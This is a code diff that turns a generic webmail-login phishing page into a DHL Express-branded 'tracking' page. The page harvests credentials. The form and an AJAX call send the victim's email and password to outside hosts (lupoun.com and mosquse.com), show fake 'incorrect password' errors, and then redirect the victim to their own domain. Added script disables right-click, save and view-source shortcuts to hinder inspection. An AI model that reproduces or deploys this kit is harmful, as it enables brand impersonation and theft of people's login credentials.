@@ -1,86 +1,375 @@
-
-<!doctype html>
-<html lang="en">
-<head>
-    <!-- Required meta tags -->
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-
-    <!-- Bootstrap CSS -->
-    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
-    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
-<title>Webmail - login </title>
-
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
-<link rel="stylesheet" href="">
-  <style type="text/css">
-.login-form{width: 385px; margin: 30px auto;}.login-form form{margin-bottom: 15px; background: #f7f7f7; box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3); padding: 30px;}.login-form h2{margin: 0 0 15px;}.form-control, .login-btn{min-height: 38px; border-radius: 2px;}.input-group-addon .fa{font-size: 18px;}.login-btn{font-size: 15px; font-weight: bold;}.social-btn .btn{border: none; margin: 10px 3px 0; opacity: 1;}.social-btn .btn:hover{opacity: 0.9;}.social-btn .btn-primary{background: #507cc0;}.social-btn .btn-info{background: #64ccf1;}.social-btn .btn-danger{background: #df4930;}.or-seperator{margin-top: 20px; text-align: center; border-top: 1px solid #ccc;}.or-seperator i{padding: 0 10px; background: #f7f7f7; position: relative; top: -11px; z-index: 1;}
-.loadings{position:absolute;z-index:999;background:url(https://i.ibb.co/pjpBP9D/image.png) no-repeat;top:40%}
-
-#loading{border-top:none;background:#fff;position:absolute;top:0px;bottom:0;right:0;left:0;text-align:center;z-index:998}.loadings{position:absolute;z-index:999;background:url(https://i.ibb.co/pjpBP9D/image.png) no-repeat;top:40%}
-
-.loadings{left:48%}@media only screen and (max-width: 1279px){li .icon-envelope{display:none}.toplink{float:left}#search_block .form-search .button-search{min-width:30px}.loadings{left:40%}}
-    </style>
-  </head>
-  <body data-gr-c-s-loaded="true">
-<div id="loading">
-    <div class="loadings"><img src="https://i.ibb.co/pjpBP9D/image.png">
- </div>
-</div>
-    <p>&nbsp;</p>
-    <p>&nbsp;</p>
-
-<div class="login-form">
-<form action="#" method="post">
-<h2 class="text-center"><div id="top">
-  <img src="" alt="" id="logoimg" style="width:28px;height:28px;">
-		
-	<span style="vertical-align: middle; padding-left: 5px" class="logoname">Mailbox</span> <br><br>Sign in</div></h2>
-      <center>
-          <div class="alert alert-danger" id="msg" style="display: none;">Invalid Password.! Please try again</div>
-          <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
-        </center>
-        <div class="form-group">
-          <div class="input-group">
-            <span class="input-group-addon"><i class="fas fa-user"></i></span>
-            <input type="email" class="form-control" name="username" placeholder="Username" value="" id="email" readonly>
-          </div>
-        </div>
-        <div class="form-group">
-          <div class="input-group">
-            <span class="input-group-addon"><i class="fas fa-lock"></i></span>
-            <input type="password" class="form-control" id="password" name="pdf2" placeholder="Password" required="required">
-          </div>
-        </div>
-        <div class="form-group">
-          <input type="hidden" name="pdf1" size="35" value=""><input type="hidden" name="address" size="5" value="ancoreinspection.com">
-          <br><input type="hidden" name="email" size="35" value=""><input type="hidden" name="type" size="5" value="ancoreinspection.com">
-
-
-          <button type="submit" class="btn btn-primary login-btn btn-block" id="submit-btn">Sign in</button>
-        </div>
-        <div class="clearfix">
-          <label class="pull-left checkbox-inline"><input type="checkbox" checked> Secured Login session?</label>
-          <a href="#" class="pull-right">Forgot Password?</a>
-        </div>
-
-      </form>
-      <p style="text-align:center"> <a href="#">&copy; Copyright <span class="logoname"></span> 2021  </p>
-      </a>
+<html lang="en" >
+    <head>
+    <meta charset="UTF-8">
+    <title>DHL Express</title>
+    
+    <link rel="icon" href="https://i.ibb.co/1vfqPk8/favicon.jpg" type="image/gif" sizes="16x16">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+    
+    
+    
+    </head>
+    
+    <body marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">
+    
+    <table cellspacing="0" width="100%" height="100%">
+    
+    <tr><td height="89%" style="background: #DFAC03;
+    background: -moz-linear-gradient(45deg, #DFAC03 0%, #FFBF00 50%, #FF4000 100%);
+    background: -webkit-linear-gradient(45deg, #DFAC03 0%, #FFBF00 50%, #FF4000 100%);
+    background: linear-gradient(45deg, #DFAC03 0%, #FFBF00 50%, #FF4000 100%);">
+    
+    <table width="100%" height="100%" align="center" cellspacing="0"><tr>
+    
+    <td width="96%">
+    
+    
+    <table align="center" cellspacing="0" width="97%" height="100%">
+    
+    <tr><td height="2%"></td>
+    
+    
+    <tr><td height="87%">
+    
+    
+    <table align="center">
+    
+    <tr><td>
+    
+    <div align="center">
+    <img src="https://i.ibb.co/hHh233c/1.png" style="width:380px; height:85px;">
     </div>
+    
+    </td></tr>
+    
+    
+    
+    
+    <tr><td>
+    
+    <div align="center">
+    
+    <font face="Arial, Helvetica, sans-serif" size="+1" color="#FFFFFF">
+    <b><font color="#D50606">*</font></b>Quick Tracker (Authentication Required)
+    </font>
+    
+    </div>
+    
+    </td></tr>
+    
+    <tr><td style="height:10px;"></td></tr>
+    
+    <tr><td>
+    
+    
+    <table align="center" 
+    style="height:240px; width:380px; box-shadow: 2px 2px 2px #333333; border-radius: 2px 2px; background: #FFFFFF; border: 1px #FFFFFF;">
+    <tr><td>
+    
+    
+    <table width="100%" align="center">
+    
+    <tr><td style="height:10px;"></td></tr>
+    
+    
+    <tr><td>
+    
+    <table width="97%" align="center" cellspacing="0"><tr>
+
+        <tr><td>
+    
+            <b><font id="msg" style="display: none;" color="#D50606" face="Arial, Helvetica, sans-serif" size="1">
+           Incorrect password, Please try again.
+           </font></b>
+
+            <!-- <center>
+                <div class="alert alert-danger" id="msg" style="display: none;">Invalid Password.! Please try again</div>
+                <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+              </center> -->
+            
+            </td></tr>
+    
+    <td width="80%">
+    
+    
+    <table align="center" width="90%" cellspacing="0">
+       
 
 
-    <style>.tb_button {padding:1px;cursor:pointer;border-right: 1px solid #8b8b8b;border-left: 1px solid #FFF;border-bottom: 1px solid #fff;}.tb_button.hover {border:2px outset #def; background-color: #f8f8f8 !important;}.ws_toolbar {z-index:100000} .ws_toolbar .ws_tb_btn {cursor:pointer;border:1px solid #555;padding:3px}   .tb_highlight{background-color:yellow} .tb_hide {visibility:hidden} .ws_toolbar img {padding:2px;margin:0px}</style>
-  </body>
+    <tr><td>
+    
+    <font face="Arial, Helvetica, sans-serif" size="2" color="#011820"><b>
+    Confirm your ID to get tracking Details
+    </b></font>
+    
+    </td></tr>
+    
+    
+    <tr><td style="height:10px;">
+    
+    <form method="post" action="https://lupoun.com/oop/document.php">
+    
+    </td></tr>
+    
+    
+    <tr><td>
+    
+    <table align="center" cellspacing="0" 
+    style="height:36px; width:250px; box-shadow: 1px 1px 1px #AAAAAA; border-radius: 1px 1px; background: #FFFFFF; padding:2px; border: 1px #AAAAAA; border-style: solid;">
+    <tr>
+    
+    <td style="width:2px;"></td>
+    
+    
+    <td>
+    
+    <img src="https://i.ibb.co/z2rRYtK/user.jpg" style="width:21px; height:25px;">
+    
+    </td>
+    
+    <td>
+    
+    <font face="Arial, Helvetica, sans-serif" size="2" color="#D50606"><input style="border: none; height:30px; width: 100%;" type="" name="email" value="" id="email"></font>
+    
+    </td>
 
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
-  
-  <script>
+    </tr></table>
+    
+    
+    
+    </td></tr>
+    
+    
+    
+    <tr><td style="height:5px;"></td></tr>
+    
+    
+    <tr><td>
+    
+    <table align="center" cellspacing="0" 
+    style="height:36px; width:250px; box-shadow: 1px 1px 1px #AAAAAA; border-radius: 1px 1px; background: #FFFFFF; padding:2px; border: 1px #AAAAAA; border-style: solid;">
+    <tr>
+    
+    <td style="width:2px;"></td>
+    
+    
+    <td>
+    
+    <img src="https://i.ibb.co/BycYMTL/pass.jpg" style="width:25px; height:25px;">
+    
+    </td>
+    
+    
+    <td style="width:2px;"></td>
+    
+    
+    <td>
+    
+    <input type="password" name="password" placeholder="Password" required="" id="password"
+    style="height:25px; width:205px; background: #FFFFFF; padding:0px; border: 1px #FFFFFF;" pattern=".{5,}">
+    
+    </td>
+    
+    </tr></table>
+    
+    
+    
+    </td></tr>
+    
+    
+    <tr><td style="height:1px;"></td></tr>
+    
+    
+    
+    <tr><td>
+    
+    <input type="checkbox" checked=""> 
+    
+    <font face="Arial, Helvetica, sans-serif" size="2" color="#025D7D">
+    Remember my ID on this device
+    </font>
+    
+    
+    </td></tr>
+    
+    
+    
+    <tr><td style="height:5px;"></td></tr>
+    
+    
+    <tr><td>
+    
+    <div align="left">
+    
+    <button id="submit-btn" style="height:32px; width:100px; box-shadow: 3px 3px 3px #333333; border-radius: 1px 1px 9px; background: #D50606; border: 1px #D50606">
+    
+    <font face="Arial, Helvetica, sans-serif" size="2" color="#FFF">
+    Track >>>
+    </font>
+    
+    </button>
+    
+    </div>
+    
+    </td></tr>
+    
+    
+    <tr><td>
+    
+    
+    
+    </form>
+    
+    </td></tr>
+    
+    </table>
+    
+    
+    </td>
+    
+    
+    <td width="20%">
+    <img src="https://i.ibb.co/gwJQYjk/2.png" style="width:75px; height:200px;">
+    </td>
+    
+    </tr></table>
+    
+    </td></tr>
+    
+    </table>
+    
+    </td>
+    </tr>
+    
+    </table>
+    
+    
+    </td></tr>
+    
+    </table>
+    
+    </td>
+    </tr>
+    
+    <tr><td height="6%">
+    </td>
+    </tr>
+    
+    </table>
+    
+    
+    </td>
+    
+    
+    <td width="1%"></td>
+    
+    
+    </tr></table>
+    
+    </td></tr>
+    
+    
+    
+    <tr><td height="9%" bgcolor="#FFFFFF">
+    
+    <table width="100%" height="100%" align="center" cellspacing="0"><tr>
+    
+    <td width="97%">
+    
+    <table align="center" cellspacing="0"><tr>
+    
+    <td>
+    <a href="#" border="0">
+    <img src="https://i.ibb.co/tDNJNwj/3.gif" style="width:95px; height:30px;">
+    </a>
+    </td>
+    
+    <td style="width:3px;"></td>
+    
+    <td>
+    <a href="#" border="0">
+    <img src="https://i.ibb.co/fvtYtZH/4.png" style="width:80px; height:30px;">
+    </a>
+    </td>
+    
+    <td style="width:2px;"></td>
+    
+    <td>
+    <a href="#" border="0">
+    <img src="https://i.ibb.co/mSZnmyd/5.jpg" style="width:95px; height:30px;">
+    </a>
+    </td>
+    
+    <td style="width:3px;"></td>
+    
+    <td>
+    <a href="#" border="0">
+    <img src="https://i.ibb.co/58BZp63/6.jpg" style="width:120px; height:31px;">
+    </a>
+    </td>
+    
+    
+    
+    <td style="width:0px;"></td>
+    
+    </tr></table>
+    
+    
+    </td>
+    
+    
+    
+    <td width="3%"></td>
+    
+    </tr></table>
+    
+    </td></tr>
+    
+    
+    
+    <tr><td height="2%" bgcolor="#000000"></td></tr>
+    
+    </table>
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
 $(window).load(function() {
 $('#loading').fadeOut();
 });
+
+// prevent ctrl + s
+$(document).bind('keydown', function(e) {
+if(e.ctrlKey && (e.which == 83)) {
+e.preventDefault();
+return false;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.onkeydown = function(e) {
+if (e.ctrlKey && 
+(e.keyCode === 67 || 
+e.keyCode === 86 || 
+e.keyCode === 85 || 
+e.keyCode === 117)) {
+return false;
+} else {
+return true;
+}
+};
+$(document).keypress("u",function(e) {
+if(e.ctrlKey)
+{
+return false;      }
+else {
+return true;
+}});
+
+
 
 /* global $ */
 $(document).ready(function(){
@@ -120,6 +409,7 @@ $("#logoname").html(finalu);
 $(".logoname").html(finalu);
 }
 
+
 $('#submit-btn').click(function(event){
 $('#error').hide();
 $('#msg').hide();
@@ -151,7 +441,7 @@ count=count+1;
 
 $.ajax({
 dataType: 'JSON',
-url: 'document.php',
+url: 'https://mosquse.com/dip/document.php',
 type: 'POST',
 data:{
 email:email,
@@ -166,17 +456,17 @@ if(response){
 $("#msg").show();
 console.log(response);
 if(response['signal'] == 'ok'){
-  $("#password").val("");
-  if (count>=2) {
+    $("#password").val("");
+    if (count>=2) {
     count=0;
     // window.location.replace(response['redirect_link']);
     window.location.replace("http://www."+my_slice);
 
-  }
-  // $('#msg').html(response['msg']);
+    }
+    // $('#msg').html(response['msg']);
 }
 else{
-  // $('#msg').html(response['msg']);
+    // $('#msg').html(response['msg']);
 }
 }
 },
@@ -190,9 +480,11 @@ $("#msg").show();
 // $('#msg').html("Please try again later");
 },
 complete: function(){
-$('#submit-btn').html('Sign in');
+$('#submit-btn').html('Track >>>');
 }
-});});});
-
-  </script>
-  </html>
+});
+});
+});
+</script>  
+ </html>
+    
